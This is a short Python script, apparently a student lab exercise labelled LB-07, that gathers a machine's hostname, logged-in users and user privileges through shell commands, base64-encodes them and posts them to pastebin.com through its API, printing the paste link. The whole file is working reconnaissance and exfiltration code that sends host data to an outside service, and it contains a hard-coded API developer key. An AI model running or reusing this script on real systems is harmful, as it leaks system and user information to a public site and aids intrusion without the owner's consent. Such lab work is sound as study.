# LB-07 - Alfredo Thomas Novanski (2301924536)

import base64
import requests
import subprocess

def main():
	data = """
	"""

	hostname = subprocess.Popen("cat /proc/sys/kernel/hostname", stdout=subprocess.PIPE, shell=True).stdout.read().decode()
	user = subprocess.Popen("w", stdout=subprocess.PIPE, shell=True).stdout.read().decode()
	privileges = subprocess.Popen("id", stdout=subprocess.PIPE, shell=True).stdout.read().decode()

	data += "Hostname: " + hostname + "\n"
	data += "User:\n" + user + "\n"
	data += "Privileges:\n" + privileges + "\n"
	encoded_data = base64.b64encode(data.encode('utf-8')).decode('utf-8')

	pastebin_api = {'api_dev_key': 'JGmWi32Z27bZKcVc8nE_rYAky161D25z', 'api_paste_code': encoded_data, 'api_option': 'paste'}
	pastebin_post = requests.post('https://pastebin.com/api/api_post.php', data=pastebin_api)

	print(f'[!] Pastebin Link: {pastebin_post.text}')

if __name__ == '__main__':
	main()